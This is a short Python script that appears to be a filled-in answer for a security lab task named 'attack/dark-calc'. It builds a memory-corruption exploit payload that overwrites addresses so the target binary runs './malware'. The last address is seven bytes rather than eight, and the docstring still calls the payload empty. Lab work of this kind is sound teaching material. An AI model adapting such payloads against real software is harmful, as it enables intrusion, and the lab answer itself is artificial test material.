#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

payload = b"./malware\x00".ljust(16, b"A") 
payload += bytes.fromhex("f0 0f 80 00 10 72 00 00")    
payload += bytes.fromhex("57 1a 40 00 00 00 00 00")   
payload += b"A" * 8                                    
payload += bytes.fromhex("c7 1a 40 00 00 00 00")       

sys.stdout.buffer.write(payload)
